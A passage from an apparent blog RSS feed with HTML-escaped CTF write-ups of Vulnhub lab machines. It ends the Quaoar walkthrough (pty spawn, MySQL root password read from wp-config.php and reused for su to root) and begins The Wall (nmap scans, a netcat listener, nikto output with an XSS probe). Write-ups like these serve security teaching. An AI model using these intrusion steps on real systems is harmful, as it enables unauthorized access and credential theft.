Linux Quaoar 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;
 11:00:33 up 40 min,  0 users,  load average: 0.01, 0.05, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look for flags! I've found the first one in &lt;b&gt;/home&lt;/b&gt; directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wpadmin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 12
drwxr-xr-x 2 root    root    4096 Oct 22  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
2bafe61f03117ac66a73c3c514de796e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, it's time to escalate our privilages. And to my amusement, in &lt;b&gt;wp-config.php&lt;/b&gt; there was root password for &lt;b&gt;mysql&lt;/b&gt; database. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@Quaoar:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 3628
drwxr-xr-x  6 www-data www-data   4096 Oct 24  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 13 root     root       4096 Jan 15  2017 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    224 Oct 12  2016 CHANGELOG
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data  35147 Oct 12  2016 COPYING
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 652654 Oct 23  2016 Hack_The_Planet.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 281003 Oct 23  2016 Hack_The_Planet2.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 126042 Oct 23  2016 Hack_The_Planet3.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1241 Oct 12  2016 INSTALL
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data   1672 Oct 12  2016 LICENSE
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 756701 Oct 23  2016 Quaoar.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    954 Oct 12  2016 README.md
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 169045 Oct 23  2016 hack-planet-1280-amox-zone.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 261593 Oct 23  2016 hack-planet-high-definition-mobile.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 179812 Oct 23  2016 hacker-manifesto-ethical.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 616848 Oct 23  2016 hacking.jpg
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 hsperfdata_tomcat6
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    100 Oct 24  2016 index.html
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 573058 Oct 23  2016 pososibo-ethical-hacking-hack-fond.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    271 Oct 24  2016 robots.txt
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 tomcat6-tomcat6-tmp
drwxr-xr-x 13 www-data www-data   4096 Oct 12  2016 upload
drwxr-xr-x  5 www-data www-data   4096 Nov 30  2016 wordpress
www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;wp-config.php

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'rootpassword!'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it work? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
su root
Password: rootpassword!
root@Quaoar:/var/www/wordpress# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 48
drwx------  6 root root 4096 Nov 30  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwx------  2 root root 4096 Oct  7  2016 .aptitude
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  368 Jan 15  2017 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Oct 15  2016 .cache
&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;  1 root root   33 Oct 22  2016 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Oct 26  2016 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 4740 Nov 30  2016 .viminfo
drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have the last flag, together with the root access! &lt;/p&gt;
</description>
        <pubDate>Sat, 19 Aug 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-quaoar/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-quaoar/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - The Wall</title>
        <description>&lt;p&gt;Hello everyone, today we're going to go through another machine from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; called &lt;b&gt;The Wall&lt;/b&gt;. Let's take a look at the description.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd's contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.

You challenge is simple... set your controls for the heart of the sun, get root, and grab the flag! Rock on!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Looks promising, let's start it. &lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/xerubus,117/&quot;&gt;&lt;b&gt;Sagi&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/the-wall-1,130/&quot;&gt;&lt;b&gt;/dev/random/ Pipe&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.102&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;The Wall 192.168.56.103&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Firstly, we're going to do a comprehensive scan using &lt;b&gt;nmap&lt;/b&gt; in order to gain as much info as possible. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-02 10:24 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating ARP Ping Scan at 10:24
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 10:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 10:24
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
SYN Stealth Scan Timing: About 2.21% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 10:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:22:54 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 4.47% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 10:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:21:43 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;No open ports? A little bit strange, but after a while I noticed on &lt;b&gt;wireshark&lt;/b&gt;, that victim machine is trying to connect to port 1337. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/wireshark.png&quot; alt=&quot;Wireshark&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a closer look at the packet. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;102 0.299005957 192.168.56.102 192.168.56.103 TCP 54 1337 → 45058 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And set up a listener. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
192.168.56.103: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] 14489

                       .u!&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
                   .x&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
               ..+&lt;span class=&quot;s2&quot;&gt;&quot;NP
            .z&quot;&quot;   ?
          M#&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;      9     ,     ,
                   9 M  d! ,8P&lt;span class=&quot;s1&quot;&gt;'
                   R X.:x'&lt;/span&gt; R&lt;span class=&quot;s1&quot;&gt;'  ,
                   F F'&lt;/span&gt; M  R.d&lt;span class=&quot;s1&quot;&gt;'
                   d P  @  E`  ,
      ss           P  '&lt;/span&gt;  P  N.d&lt;span class=&quot;s1&quot;&gt;'
       x         ''        '&lt;/span&gt;
       X               x             &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
       9     .f       &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;
       4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt;      /         dH    &lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;
       &lt;span class=&quot;s1&quot;&gt;'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'&lt;/span&gt;   tM
        M:  &lt;span class=&quot;c&quot;&gt;#'$L  ;' M `8      X    MR&lt;/span&gt;
        &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  # X ,oR      t    Q;
         &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@  R&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;H :RP' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;     X    @'
         9&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$E&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  @Bd' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   ?X     ;    W
         &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;M&lt;span class=&quot;s1&quot;&gt;'  `$M d$    `E    ;.o* :R   ..
          `    '&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;'     '    @'   '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'   

              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don'&lt;/span&gt;t be surprised when a crack &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the ice appears under your feet. - Pink Floyd, The Thin Ice&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, our first piece of information. Another &lt;b&gt;nmap&lt;/b&gt; scan revealed that this operation triggered an port opening, &lt;b&gt;http&lt;/b&gt; is up. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-02 10:35 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:35
Completed NSE at 10:35, 0.00s elapsed
Initiating NSE at 10:35
Completed NSE at 10:35, 0.00s elapsed
Initiating ARP Ping Scan at 10:35
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 10:35, 0.21s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 10:35
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
Discovered open port 80/tcp on 192.168.56.103
Completed SYN Stealth Scan at 10:35, 12.25s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 10:35
Scanning 1 service on 192.168.56.103
Completed Service scan at 10:37, 96.21s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 service on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.103&lt;/span&gt;
NSE: Script scanning 192.168.56.103.
Initiating NSE at 10:37
Completed NSE at 10:37, 7.19s elapsed
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00081s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
MAC Address: 08:00:27:B1:35:60 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4, OpenBSD 5.3
Uptime guess: 0.000 days (since Wed Aug  2 10:37:21 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Randomized

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 192.168.56.103

NSE: Script Post-scanning.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.93 seconds
           Raw packets sent: 3051 (136.796KB) | Rcvd: 20 (1.024KB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's take a look at the website. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/website.png&quot; alt=&quot;Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And it's code. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#000000&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pink_floyd.jpg&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have a hex string in a comment, which we can translate. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;737465673d3333313135373330646262623337306663626539373230666536333265633035
steg=33115730dbbb370fcbe9720fe632ec05&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But I have no clue about its use. My next step is to run &lt;b&gt;nikto&lt;/b&gt; in order to gain something more about the website. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.56.103
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2017-08-02 10:43:24 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ Retrieved x-powered-by header: PHP/5.6.11
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ /postnuke/modules.php?op&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;modload&amp;amp;name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Web_Links&amp;amp;file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index&amp;amp;req&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;viewlinkdetails&amp;amp;lid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;666&amp;amp;ttitle&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Mocosoft Utilities&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;%3&amp;lt;script&amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Vulnerable'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/script&amp;gt;: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;XSS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; http://www.cert.org/advisories/CA-2000-02.html.
+ 7538 requests: 3 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 5 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
